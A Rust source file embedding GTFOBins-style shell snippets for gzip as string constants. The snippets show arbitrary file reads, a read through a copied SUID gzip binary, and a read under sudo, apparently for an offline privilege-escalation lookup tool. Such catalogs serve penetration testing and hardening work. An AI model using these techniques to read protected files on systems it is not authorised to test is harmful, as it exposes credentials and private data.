pub static BIN_NAME: &'static str = "gzip";
pub static BIN_DESC: &'static str = "There are also a number of other utilities that rely on `gzip` under the hood, e.g., `zless`, `zcat`, `gunzip`, etc. Besides having similar features, they also allow privileged reads if `gzip` itself is SUID.";
pub static FR_CODE_1: &'static str = r#"
    
    LFILE=file_to_read
    gzip -f $LFILE -t
"#;
pub static FR_CODE_2: &'static str = r#"
    
    LFILE=file_to_read
    gzip -c $LFILE | gzip -d
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which gzip) .

    LFILE=file_to_read
    ./gzip -f $LFILE -t
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo gzip -f $LFILE -t
"#;
use crate::code::{Code, Tag};
pub static FR_1: Code<'static> = Code {
    title: "FR_CODE_1",
    code: FR_CODE_1,
    tag: Tag::FR,
};
pub static FR_2: Code<'static> = Code {
    title: "FR_CODE_2",
    code: FR_CODE_2,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
